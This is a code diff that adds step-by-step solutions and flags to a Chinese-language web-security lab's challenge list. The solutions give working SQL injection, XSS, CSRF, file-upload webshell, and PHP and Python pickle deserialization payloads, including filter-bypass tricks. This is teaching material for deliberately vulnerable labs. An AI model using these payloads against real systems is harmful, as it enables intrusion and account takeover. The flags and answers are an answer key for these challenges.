@@ -266,42 +266,87 @@ export const vulnerabilities = [
     objective: '通过SQL注入绕过登录，获取管理员权限',
     hints: [
       '尝试在用户名输入框中输入特殊字符',
-      "考虑使用 ' OR 1=1-- 这样的payload",
-      '注意SQL语句的闭合方式'
+      "考虑使用 ' OR 1=1-- 这样的payload绕过登录",
+      '登录成功后，尝试使用UNION查询获取flag',
+      '数据库中有单独的flag表'
     ],
-    flag: 'Mlai{SQLi-Easy-Success}'
+    flag: 'Mlai{sqli_easy_2026_get_flag}',
+    solution: [
+      '分析目标：登录表单使用GET方法提交，SQL语句直接拼接用户输入',
+      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
+      '第一步：登录绕过',
+      '在用户名输入框输入：\' OR 1=1--',
+      '执行的SQL：SELECT * FROM users WHERE username = \'\' OR 1=1--\' AND password = \'\'',
+      '解释：\' 闭合username的引号，OR 1=1使条件永远为真，--注释掉后面内容',
+      '密码框可以留空，提交后成功绕过登录验证',
+      '第二步：获取flag',
+      '数据库中有flag表存储真正的flag，需要使用UNION查询',
+      '在用户名输入框输入：\' UNION SELECT 1,flag,3 FROM flag--',
+      '执行的SQL：SELECT * FROM users WHERE username = \'\' UNION SELECT 1,flag,3 FROM flag--\' AND password = \'\'',
+      '解释：UNION查询将flag表的数据合并到结果中，flag会显示在password字段位置',
+      '登录成功后即可看到Flag: Mlai{sqli_easy_2026_get_flag}'
+    ]
   },
   {
     id: 2,
     name: 'SQL注入-中级',
     type: 'sqli',
     difficulty: 'medium',
-    summary: '学习联合查询和数据枚举技巧',
-    tags: ['联合查询', '数据枚举', 'UNION'],
-    scenario: '用户列表页面存在SQL注入漏洞，可以获取更多数据',
-    objective: '通过UNION查询获取管理员密码',
+    summary: '学习绕过基础过滤的SQL注入技巧',
+    tags: ['绕过过滤', '登录绕过', '中级'],
+    scenario: '登录页面存在SQL注入漏洞，但有基础过滤',
+    objective: '绕过过滤机制，成功登录',
     hints: [
-      '尝试使用UNION SELECT语句',
-      '需要知道表名和列名',
-      '可以使用ORDER BY判断列数'
+      '测试哪些字符被过滤了',
+      '尝试使用不同的注释方式',
+      '可以使用内联注释/**/绕过'
     ],
-    flag: 'Mlai{SQLi-Medium-Success}'
+    flag: 'Mlai{sqli_medium_bypass_comment}',
+    solution: [
+      '分析目标：页面使用str_replace过滤了 --、#、/* 等注释符',
+      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
+      '测试发现：--、#、/* 被替换为空，无法使用注释符绕过',
+      '绕过方法：不使用注释符，直接闭合引号构造恒真条件',
+      '在用户名输入框输入：\' OR \'1\'=\'1',
+      '执行的SQL：SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' AND password = \'\'',
+      '解释：前一个\'闭合username的引号，OR \'1\'=\'1使条件永远为真',
+      '密码框可以留空，提交后成功绕过登录验证',
+      '使用UNION查询获取flag：\' UNION SELECT 1,flag,3 FROM flag',
+      '执行后获取Flag: Mlai{sqli_medium_bypass_comment}'
+    ]
   },
   {
     id: 3,
     name: 'SQL注入-高级',
     type: 'sqli',
     difficulty: 'hard',
-    summary: '学习盲注技术和高级绕过技巧',
-    tags: ['盲注', '时间盲注', '布尔盲注'],
-    scenario: '页面没有直接输出，但可以通过时间延迟判断',
-    objective: '通过盲注技术获取数据库中的flag',
+    summary: '学习绕过高级过滤的SQL注入技巧',
+    tags: ['高级过滤', '字符替换', '盲注'],
+    scenario: '登录页面存在SQL注入漏洞，但有严格的关键词过滤',
+    objective: '绕过严格过滤，成功登录',
     hints: [
-      '尝试使用IF条件语句',
-      '使用SLEEP()函数判断执行',
-      '可以编写脚本自动化注入'
+      '测试哪些关键词被过滤',
+      '尝试大小写混合绕过',
+      '可以使用字符编码或内联注释'
     ],
-    flag: 'Mlai{SQLi-Hard-Success}'
+    flag: 'Mlai{sqli_hard_double_write_bypass}',
+    solution: [
+      '分析目标：页面使用preg_replace不区分大小写过滤了 union, select, or, and, --, #, /*, */等关键词',
+      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
+      '测试发现：or, and, --, #等关键词都被过滤（不区分大小写）',
+      '注意：注释符--和#也被过滤，无法使用注释绕过',
+      '绕过方法1 - 双写绕过：在用户名输入框输入 \' oorr \'1\'=\'1',
+      '过滤后：\' or \'1\'=\'1，双写的oorr被过滤后还原为or',
+      '执行的SQL：SELECT * FROM users WHERE username = \'\' or \'1\'=\'1\' AND password = \'\'',
+      '绕过方法2 - 使用其他逻辑运算符：\' || \'1\'=\'1',
+      'MySQL中||等价于OR，不在过滤列表中',
+      '执行的SQL：SELECT * FROM users WHERE username = \'\' || \'1\'=\'1\' AND password = \'\'',
+      '绕过方法3 - 使用十六进制编码：\' || 0x31=0x31',
+      '0x31是数字1的十六进制表示，不在过滤列表中',
+      '使用UNION查询获取flag：\' uniionn sselectt 1,flag,3 from flag',
+      '双写的union和select被过滤后还原为正常关键词',
+      '执行后获取Flag: Mlai{sqli_hard_double_write_bypass}'
+    ]
   },
   {
     id: 4,
@@ -317,7 +362,16 @@ export const vulnerabilities = [
       '调用页面中已定义的函数',
       '注意特殊字符的编码'
     ],
-    flag: 'Mlai{XSS-Reflected-Success}'
+    flag: 'Mlai{xss_reflected_flag}',
+    solution: [
+      '分析目标：搜索功能的输入会直接输出到页面，没有任何过滤',
+      '页面中已定义showFlag()函数可以弹出flag',
+      '在搜索框输入：<script>showFlag()</script>',
+      '或者通过URL参数：?data=<script>showFlag()</script> 或 ?x=<script>showFlag()</script>',
+      '提交表单或访问URL后，脚本直接执行',
+      'showFlag()函数被调用，弹出Flag: Mlai{xss_reflected_flag}',
+      '成功获取flag'
+    ]
   },
   {
     id: 5,
@@ -333,7 +387,17 @@ export const vulnerabilities = [
       '脚本会在所有访问者页面执行',
       '可以窃取其他用户的信息'
     ],
-    flag: 'Mlai{XSS-Stored-Success}'
+    flag: 'Mlai{xss_stored_flag}',
+    solution: [
+      '分析目标：留言板功能将用户输入追加存储到/tmp/messages.txt并直接输出',
+      '页面中已定义showFlag()函数可以弹出flag',
+      '在留言框输入：<script>showFlag()</script>',
+      '提交留言后，脚本被存储到/tmp/messages.txt文件中',
+      '每次有人访问页面，服务器会读取文件内容并直接输出',
+      '存储的脚本在所有访问者的浏览器中执行',
+      '脚本执行后调用showFlag()函数弹出Flag: Mlai{xss_stored_flag}',
+      '成功获取flag'
+    ]
   },
   {
     id: 6,
@@ -349,7 +413,19 @@ export const vulnerabilities = [
       '尝试在输入框中注入脚本',
       '注意innerHTML不会执行<script>标签，可以使用其他方式'
     ],
-    flag: 'Mlai{XSS-DOM-Success}'
+    flag: 'Mlai{xss_dom_flag}',
+    solution: [
+      '分析目标：页面使用innerHTML动态更新内容，没有任何服务端过滤',
+      '页面中已定义showFlag()函数可以弹出flag',
+      '注意：innerHTML不会执行<script>标签，但会执行HTML事件处理器',
+      '在输入框输入：<img src=x onerror=showFlag()>',
+      '或者使用：<svg onload=showFlag()> 或 <body onload=showFlag()>',
+      '点击按钮触发showOutput()函数',
+      'innerHTML将输入内容插入到页面DOM中',
+      'img标签加载失败触发onerror事件，执行showFlag()函数',
+      '弹出Flag: Mlai{xss_dom_flag}',
+      '成功获取flag'
+    ]
   },
   {
     id: 7,
@@ -365,7 +441,19 @@ export const vulnerabilities = [
       '需要找到可利用的类',
       '可以使用工具生成payload'
     ],
-    flag: 'Mlai{PHP-Deserialization-Success}'
+    flag: 'Mlai{PHP-Deserialization-Success}',
+    solution: [
+      '分析目标：应用程序直接使用unserialize()处理用户提交的POST数据',
+      '查看源代码，发现FileReader类有__destruct魔术方法',
+      '__destruct方法会读取filename属性指定的文件并输出',
+      '构造FileReader对象，设置filename为/var/www/html/flag.txt',
+      '生成序列化数据：O:10:"FileReader":1:{s:8:"filename";s:24:"/var/www/html/flag.txt";}',
+      '将payload粘贴到输入框并提交',
+      '服务器执行unserialize()反序列化数据，创建FileReader对象',
+      '脚本执行结束时对象被销毁，触发__destruct方法',
+      '__destruct读取flag文件并输出Flag: Mlai{PHP-Deserialization-Success}',
+      '成功获取flag'
+    ]
   },
   {
     id: 8,
@@ -381,7 +469,21 @@ export const vulnerabilities = [
       '检查服务器是否检查文件内容',
       '可以尝试修改文件头绕过检测'
     ],
-    flag: 'Mlai{File-Upload-Success}'
+    flag: 'Mlai{file_upload_flag}',
+    solution: [
+      '分析目标：文件上传功能只允许jpg, png, gif扩展名，使用pathinfo检查',
+      '创建PHP文件：<?php echo file_get_contents(\'/var/www/html/flag.txt\'); ?>',
+      '保存为shell.php',
+      '尝试直接上传会被拦截，提示只允许图片文件',
+      '绕过方法1 - 双重扩展名：将文件名改为shell.php.jpg',
+      '绕过方法2 - 使用服务器支持的其他PHP扩展名：shell.phtml 或 shell.php5',
+      '绕过方法3 - 图片马：在PHP代码前添加GIF头 GIF89a',
+      '例如：GIF89a<?php echo file_get_contents(\'/var/www/html/flag.txt\'); ?>',
+      '将文件保存为shell.gif或shell.jpg',
+      '上传成功后访问：http://target/uploads/shell.gif',
+      '如果服务器配置允许，会解析执行PHP代码显示Flag: Mlai{file_upload_flag}',
+      '成功获取flag'
+    ]
   },
   {
     id: 9,
@@ -397,7 +499,23 @@ export const vulnerabilities = [
       '构造恶意链接或表单',
       '诱导用户点击或访问'
     ],
-    flag: 'Mlai{CSRF-Easy-Success}'
+    flag: 'Mlai{CSRF-Easy-Success}',
+    solution: [
+      '分析目标：修改密码功能没有任何CSRF防护，没有Token验证',
+      '页面有一个表单，POST提交password参数到当前页面',
+      '构造恶意HTML页面（可保存在攻击者服务器）：',
+      '<html>',
+      '<body onload="document.forms[0].submit()">',
+      '<form action="http://target/csrf-easy/" method="POST">',
+      '<input type="hidden" name="password" value="hacked!"/>',
+      '</form>',
+      '</body>',
+      '</html>',
+      '诱导已登录用户点击链接或自动访问该页面',
+      '用户浏览器自动发送POST请求，密码被修改为"hacked!"',
+      '访问 http://target/csrf-easy/?get_flag 获取Flag: Mlai{CSRF-Easy-Success}',
+      '成功获取flag'
+    ]
   },
   {
     id: 10,
@@ -413,7 +531,22 @@ export const vulnerabilities = [
       '尝试获取或伪造Token',
       '考虑使用XSS配合CSRF'
     ],
-    flag: 'Mlai{CSRF-Hard-Success}'
+    flag: 'Mlai{CSRF-Hard-Success}',
+    solution: [
+      '分析目标：网站使用Referer验证，检查Referer是否包含当前主机名',
+      '验证逻辑：if (empty($referer) || strpos($referer, $host) === false)',
+      '绕过思路：构造包含目标主机名的Referer即可',
+      '方法1 - 使用iframe：在恶意页面中嵌入目标网站的页面',
+      '<iframe src="http://target/csrf-hard/" style="display:none"></iframe>',
+      '<script>frames[0].document.forms[0].password.value="hacked!";frames[0].document.forms[0].submit();</script>',
+      '方法2 - 构造特殊Referer：让Referer包含目标域名',
+      '例如在攻击者网站放置图片：<img src="http://target/csrf-hard/?x=1">',
+      '然后在Referer中包含 target 字符串',
+      '方法3 - 使用本地HTML文件：打开本地HTML文件，用script发起请求',
+      '由于是file://协议，某些浏览器会保留referer',
+      '成功将密码修改为"hacked!"后，访问 ?get_flag 获取Flag: Mlai{CSRF-Hard-Success}',
+      '成功获取flag'
+    ]
   },
   {
     id: 11,
@@ -429,6 +562,24 @@ export const vulnerabilities = [
       '构造恶意类或函数',
       '使用__reduce__方法执行代码'
     ],
-    flag: 'Mlai{Python-Deserialization-Success}'
+    flag: 'Mlai{Python-Deserialization-Success}',
+    solution: [
+      '分析目标：应用程序先base64解码用户输入，再使用pickle.loads()反序列化',
+      '服务器端已定义FlagReader类，__reduce__方法执行os.system("cat /flag.txt")',
+      '构造恶意类，在__reduce__方法中返回执行命令的元组',
+      '编写Python代码生成payload：',
+      'import pickle',
+      'import base64',
+      'import os',
+      'class Exploit:',
+      '    def __reduce__(self):',
+      '        return (os.system, ("cat /flag.txt",))',
+      'payload = base64.b64encode(pickle.dumps(Exploit())).decode()',
+      '或者直接使用服务器端已有的FlagReader类',
+      '将生成的payload粘贴到输入框并提交',
+      '服务器先base64解码，再执行pickle.loads()反序列化',
+      '__reduce__方法被调用，执行系统命令cat /flag.txt',
+      '成功获取Flag: Mlai{Python-Deserialization-Success}'
+    ]
   }
 ]
